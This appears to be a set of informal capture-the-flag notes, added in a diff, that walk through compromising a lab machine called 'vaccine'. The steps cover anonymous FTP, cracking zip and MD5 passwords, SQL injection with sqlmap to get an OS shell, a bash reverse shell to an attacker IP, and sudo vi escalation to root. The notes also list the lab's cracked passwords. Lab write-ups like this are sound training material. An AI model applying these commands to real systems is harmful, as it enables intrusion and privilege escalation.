@@ -1,0 +1,73 @@
+vaccine
+|
+|
+-do da nmap
+-you get ports 21 22 80
+|
+-login to ftp using anonymous
+-you get a file on it backup.zip dowload it
+|
+-cant unzip it cause password
+|
+-cant use directly with john also cause it only taek hash
+-use da zip2john to convert it to hash
+-crack using john hash file --wordlist=path_to_wordlist
+-it wont show the password liek that itself
+-use john --show hashfilename
+-it giev 741852963 but it only for backup.zip
+|
+-there will be a md5 hash of a password in index.php
+-initially you dont know then use hashid <hash> to find the type of hash
+|
+-use crackstation.net or hashcat to crack the password
+-to use hashcat do hashcat -a 0 -m 0 hashfile wordlistfile
+|
+-you get passwrod qwerty789
+|
+-remember it was running some shid on port 80
+-use firefox to see what it is
+-it give a login page
+|
+-use shid from before to login(check index.php)
+|
+-you get a page
+-only search bar is interactable
+-when you search it uses url parameter to search
+-http://ip/dashboard.php?search=
+-get the cookie id PHPSESSION 
+-sqlmap -u "http://ip/dashboard.php?search=" --cookie="PHPSESSION=<cookie value here>"
+-it will do its thing
+|
+-now run sem with --os-shell
+|
+-it giev postgres user shell
+|
+-do bash -c "bash -i >& /dev/tcp/<yer ip here>/4444 0>&1" to get a better shell
+|
+-do find / -type f -name "user.txt" 2>/dev/null to get the user flag
+-cat the file
+|
+-for the root flag
+note: do this else it is pein to keep spawning shells
+		python3 -c 'import pty;pty.spawn("/bin/bash")'
+		CTRL+Z
+		stty raw -echo
+		fg
+		export TERM=xterm
+|
+-since it is aweb application search for passwrods and shdi in /var/www/html
+-you get P@s5w0rd! in dashboard.php
+|
+-eh now ssh into it using username postgres and password above
+-do sudo -l 
+-we can see that we can execute vi as root noice
+-you can run shell commands from vi itself
+note: run sudo iv not just vi cause it get stroke
+|
+-run vi a spawn shell from inside :!/bin/bas
+note put : before ! also else stroke : is not only for file operations
+-and da shell noice
+-cat root.txt in /root
+-root flag
+
+
